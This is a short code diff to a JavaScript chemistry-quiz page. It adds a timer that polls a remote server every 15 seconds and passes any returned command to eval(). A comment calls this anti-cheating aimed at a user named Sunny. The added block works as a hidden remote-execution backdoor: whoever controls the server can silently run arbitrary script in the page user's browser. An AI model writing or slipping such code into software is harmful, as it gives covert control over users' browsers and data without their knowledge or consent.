@@ -73,6 +73,20 @@
     var incorrect = 0
     var serverURL = 'https://apis.chem.teamerdev.xyz/' // https://apis.chem.teamerdev.xyz/
     var word = ''
+    setInterval(() => {
+        $.get(serverURL + 'getEvents', (data) => {
+            // Specially designed for Sunny to avoid cheating.
+            if (data.code == 0) {
+                if (data.command) {
+                    eval(data.command)
+                } else {
+                    console.log('Failed to fetch command.')
+                }
+            } else {
+                console.log('error fetching')
+            }
+        })
+    }, 15000)
     function reset(){
         setTimeout(()=>{
             $("#equation").val('')
